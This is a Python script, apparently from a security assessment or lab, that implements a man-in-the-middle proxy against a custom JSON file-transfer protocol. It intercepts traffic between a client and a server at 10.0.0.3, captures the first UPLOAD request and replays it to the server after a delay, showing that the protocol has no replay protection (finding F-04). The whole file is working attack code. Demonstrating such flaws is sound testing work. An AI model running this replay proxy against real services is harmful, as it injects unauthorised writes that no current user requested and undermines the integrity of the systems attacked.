#!/usr/bin/env python3
"""
mitm_F04.py - Upload Replay Attack
Finding: F-04
Violated: R4, R8
The MITM captures an UPLOAD request, forwards it normally, then replays
it a second time after a delay. The server processes both — the second
write is not the result of any current honest user request.
"""

import socket
import threading
import json
import time

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 9000
SERVER_HOST  = "10.0.0.3"
SERVER_PORT  = 9000

REPLAY_DELAY = 3   # seconds after first upload before replaying


def send_raw(sock, line_bytes):
    sock.sendall(line_bytes + b"\n")


def replay_upload(captured_line, delay):
    time.sleep(delay)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_HOST, SERVER_PORT))
        print(f"\n[F-04 REPLAY] Replaying UPLOAD after {delay}s delay...")
        send_raw(s, captured_line)
        buf = b""
        while b"\n" not in buf:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
        line, _ = buf.split(b"\n", 1)
        resp = json.loads(line.decode("utf-8"))
        print(f"[F-04 REPLAY] Server accepted replay: {json.dumps(resp)}\n")
        s.close()
    except Exception as e:
        print(f"[F-04 REPLAY] Error: {e}")


replayed = [False]


def forward(src, dst, label):
    buf = b""
    try:
        while True:
            chunk = src.recv(4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                try:
                    obj = json.loads(line.decode("utf-8"))
                    if label == "C->S" and obj.get("action") == "UPLOAD" and not replayed[0]:
                        replayed[0] = True
                        print(f"[F-04] Captured UPLOAD for '{obj.get('filename')}', will replay in {REPLAY_DELAY}s")
                        threading.Thread(
                            target=replay_upload,
                            args=(line, REPLAY_DELAY),
                            daemon=True
                        ).start()
                except Exception:
                    pass
                dst.sendall(line + b"\n")
    except Exception:
        pass
    finally:
        try:
            dst.shutdown(socket.SHUT_WR)
        except Exception:
            pass


def handle_connection(client_sock, client_addr):
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_sock.connect((SERVER_HOST, SERVER_PORT))
    except Exception as e:
        print(f"[MITM] Cannot connect to server: {e}")
        client_sock.close()
        return

    t1 = threading.Thread(target=forward, args=(client_sock, server_sock, "C->S"), daemon=True)
    t2 = threading.Thread(target=forward, args=(server_sock, client_sock, "S->C"), daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    client_sock.close()
    server_sock.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(5)
    print(f"[F-04] Upload replay attack active...")
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle_connection, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()
